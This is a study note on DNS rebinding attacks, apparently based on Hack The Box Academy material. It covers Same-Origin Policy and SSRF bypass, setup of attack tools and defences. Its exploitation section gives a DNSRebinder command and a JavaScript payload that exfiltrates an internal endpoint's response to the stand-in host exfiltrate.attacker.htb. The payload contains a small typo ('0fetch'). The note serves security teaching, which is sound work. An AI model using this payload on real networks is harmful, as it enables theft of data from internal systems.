# Description
[DNS Rebinding](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-rebinding) is an advanced attack technique that relies on changes in the Domain Name System (DNS); it allows an attacker to bypass insufficient SSRF filters as well as the Same-Origin policy.

# SSRF

[[1. Server-Side Request Forgery#DNS Rebinding]]

# Same-Origin Policy Bypass

Let us assume the following setting: our victim is browsing the internet on their work laptop, located within their company network. The company network contains an internal web application hosting confidential information at `http://192.168.178.1/`; therefore, the application is only accessible within the company's internal network. To exfiltrate data from this internal web application, we can utilize DNS rebinding as follows:

1. The attacker (us) obtains the domain name `attacker.htb` and configures the DNS server, with a low TTL, to resolve the domain name to the IP address of the web application running a malicious JavaScript payload.
2. The victim accesses the attacker's web application at `http://attacker.htb`, resolving `attacker.htb` to the attacker's web application's IP address and loading the malicious JavaScript payload
3. The attacker updates/`rebinds` the DNS setting of the domain `attacker.htb` to resolve to `192.168.178.1` (DNS rebinding)
4. The JavaScript payload makes an HTTP `GET` request to `http://attacker.htb/secret`, and, due to DNS rebinding, `attacker.htb` now resolves to `192.168.178.1`. Therefore, the victim's browser sends the request to the internal web application. Since the origin does not differ (i.e., scheme, host, and port are the same), it is `not` considered a `cross-origin request`. As a result, the JavaScript code can access the response without violating the `Same-Origin` policy.
5. The JavaScript payload exfiltrates the response to another attacker-controlled domain, for example, `http://exfiltrate.attacker.htb`

![[Pasted image 20250327110033.png]]
Instead of exfiltrating the response, the attacker could use the same methodology to manipulate the internal web application by sending different HTTP requests such as `POST`, `PUT`, or `DELETE`. Since this is not considered a cross-origin request, the attacker can set all request parameters freely without violating the Same-Origin policy.

**Note:** The port the internal web application runs on must be the same as the attacker web application to ensure that the origin matches. For instance, if the internal web application runs on port `8000`, the attacker web application must also run on the same port, i.e., `http://attacker.htb:8000`. Thus, the attacker must know the IP address and port of the internal web application beforehand for a successful attack.

## Exploitation

Now that we have discussed the attack chain let us explore the exploitation process in more detail. In our example, the internal web application running at `http://192.168.178.1` contains the `/secret` endpoint from which we want to exfiltrate data. 

After configuring the proper DNS `NS` entry, we can use `DNSRebinder` for the DNS rebinding attack on our domain `http://www.attacker.htb`, with the public IP address of our web server replacing `$PUBLIC_WEBSERVER_IP`:

```bash
sudo python3 dnsrebinder.py --domain www.attacker.htb. --rebind 192.168.178.1 --ip $PUBLIC_WEBSERVER_IP --counter 1 --tcp --udp
```

Finally, we need to host the following payload on our web server and start our exfiltration server at `http://exfiltrate.attacker.htb:1337`:

```html
<script>
    startAttack();

    function startAttack(){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://www.attacker.htb/secret', true);
        xhr.onload = () => {
          0fetch('http://exfiltrate.attacker.htb:1337/log?data=' + btoa(xhr.response));
        };
        xhr.send();

    setInterval(startAttack, 2000);
    }
</script>
```


The payload calls itself every 2 seconds to increase the probability of a successful attack. If a victim accesses our website at `http://www.attacker.htb`, DNSRebinder executes the DNS rebinding such that we simply have to wait for the request to our exfiltration server:

```shell-session
python3 -m http.server 1337  
```

Therefore, the attacker can successfully exfiltrate secret data, regardless of the web application being only accessible from the internal network.

## Restrictions

Internal applications protected by authentication are effectively safe from DNS rebinding attacks because the session cookies of victims are not sent with requests, even if they are logged in to the internal application. That is because the victim's browser thinks it is communicating with the origin `http://attacker.htb` and thus sends cookies associated with this origin with the request. Potential session cookies stored for the origin `http://192.168.178.1` are not sent alongside the request since the origin differs, even though the domain name `attacker.htb` resolves to `192.168.178.1`. Therefore, attackers cannot perform authenticated actions when conducting DNS rebinding attacks if they do not possess valid credentials.

Since session cookies are not sent alongside requests, targeting publicly accessible applications/endpoints is often inadvisable; however, there are a few exceptions. An example is an IP-based authentication web application, which allows access to only a whitelist of IP addresses. Attackers could bypass these web applications using DNS rebinding. However, CSRF-like vulnerabilities generally do not arise from DNS rebinding since the requests are unauthenticated due to a lack of session cookies in the request.

Modern browsers implement `DNS caching`, a technique that caches the result of DNS resolutions for a configurable period, regardless of the actual TTL of the DNS record. To bypass `DNS caching`, we need to wait for this period before the DNS rebinding attack can succeed, which is why our payload called itself every 2 seconds. Firefox provides the `network.dnsCacheExpiration` setting to alter the caching period.

Furthermore, in 2023, the WC3 draft specification titled Local Network Access is currently under development to mitigate DNS rebinding vulnerabilities. While this specification is still in progress and has not reached widespread adoption, it holds the potential to become the standard in the latest web browser versions, offering comprehensive protection against DNS rebinding attacks. The draft introduces two new HTTP headers:

- `Access-Control-Request-Local-Network`: the request header set by the browser if the current origin's IP address makes a request to an origin with a `less public` IP Address
- `Access-Control-Allow-Local-Network`: the response header set by a web application if the response can be shared with external networks

In this case, `less public` is defined as any IP address pointing to the local machine (e.g. `127.0.0.1`) if the origin's IP address is not pointing to the local machine (e.g. `192.168.178.1`). If the origin's IP address is public, then `less public` would refer to any private IP address. This prevents DNS rebinding by considering the IP address an origin resolves to when making a request.

In our exploitation example, the origin `http://attacker.htb` resolves to a `public` IP address and, after the DNS rebinding, makes a request to the same origin, which then resolves to a `private` IP address. As such, the targeted IP address is `less public`, and the browser sets the `Access-Control-Request-Local-Network` header.

The web browser tightens the Same-Origin policy if the targeted web application does not explicitly allow the response to be shared with the external network by setting the `Access-Control-Allow-Local-Network` header. It prevents JavaScript code running on `http://attacker.htb` from accessing the response, even though the origin is the same. Thus, the attacker is unable to exfiltrate the response.
# Tools and Prevention

## DNS Rebinding Tools

Since DNS rebinding attacks are rather complex, we should avoid configuring everything manually. Luckily for us, there are useful tools we can use to help us in executing DNS rebinding attacks, such as [Singularity](https://github.com/nccgroup/singularity), a powerful DNS rebinding attack framework. To install it, we can run the following commands:

### Singularity

```shell-session
git clone https://github.com/nccgroup/singularity
cd singularity/cmd/singularity-server
go build
```

Afterward, we can run the web interface, which we need to start on the same port as the web application we want to exfiltrate data from:

```shell-session
mkdir -p ~/singularity/html
cp singularity-server ~/singularity/
cp -r ../../html/* ~/singularity/html/
sudo ~/singularity/singularity-server --HTTPServerPort 80
```

![[Pasted image 20250327111312.png]]

## Prevention

### SSRF Filter Bypasses

As we have discussed, preventing access to the internal network via SSRF filters is a challenging task. We must consider how different protocols, such as DNS and HTTP, interplay and what options an attacker has to make our application access the internal network. Generally, there are a few best practices we can apply to reduce the risk:

1. Resolve the domain name passed to the application before checking it; this ensures that we are working on an IP address in the format we expect, and we do not have to worry about domain names such as `localtest.me`, `localhost` or IP addresses in an unexpected format (such as hex or octal representations).
2. If possible, check the resolved IP address against a whitelist of allowed IP addresses. If this is impossible, block the entire private IP address range, i.e., `10.0.0.0/8`, `172.16.0.0./12`, and `192.168.0.0/16`. Additionally, block all IP addresses that might resolve to the local machine, which include `127.0.0.0/8` and `0.0.0.0/8`.
3. Consider redirects. If the application follows redirects, consider how the filter can be bypassed using HTTP or HTML redirects and implement application-dependent mitigations accordingly.
4. Most importantly: Implement firewall rules that prevent outgoing access from the system the vulnerable application runs on to the internal network. This prevents any access even if filters get bypassed.

Preventing SSRF filter bypasses via DNS rebinding can be achieved by not resolving the domain name twice. After resolving it in the SSRF filter, we need to fix the resolved IP address and reuse it when the application makes the actual request; the implementation of how to achieve this is application dependent.

### DNS Rebinding

The danger of Same-Origin policy bypasses via DNS rebinding is that this technique enables attackers to access applications running in the victim's local network, thus circumventing security controls such as firewalls or NAT. System administrators often assume that the local network is trusted and that no additional authentication is required when accessing an application. For instance, if there is a printer on the local network, everyone who can connect to the printer can typically print without any authentication. However, as we learned, DNS rebinding breaches these faulty assumptions.

Because DNS rebinding vulnerabilities are not caused by a specific flaw in an application, we need to ensure the following best practices when designing our internal network:

1. Use authentication on all services in the internal network. DNS rebinding can only be used to access internal applications with the cookies of the corresponding domain name. If an attacker does not know credentials to the internal application to log in themselves, only unauthenticated access can be achieved. Thus, it is vital to protect sensitive information or functionality using authentication, even if it is only exposed within the local network.
2. Use TLS on all external and internal services. If an attacker uses DNS rebinding to access an internal service over TLS, there will be a certificate mismatch as the access uses an incorrect domain name. For more details about HTTPs and TLS attacks, check out the [HTTPs/TLS Attacks](https://academy.hackthebox.com/module/details/184) module.

Additionally, there are a few hardening measures we can implement to prevent DNS rebinding attacks:

1. Refuse DNS lookups of internal IP addresses. Suppose the DNS server responds to any DNS request containing a domain name that resolves to an internal IP address with an `NXDOMAIN` response (i.e., a response indicating that the domain name does not exist). In that case, it becomes impossible to conduct DNS rebinding since internal IP addresses are not resolved.
2. Validate the HTTP `Host` header of incoming HTTP requests. Due to the nature of DNS rebinding, the resulting access to the internal network uses an incorrect domain name and, thus, an incorrect `Host` header. If the targeted application checks the `Host` header, it receives an unexpected value and should reject the request. For more details on the `Host` header and its attacks, check out the [Abusing HTTP Misconfigurations](https://academy.hackthebox.com/module/details/189) module.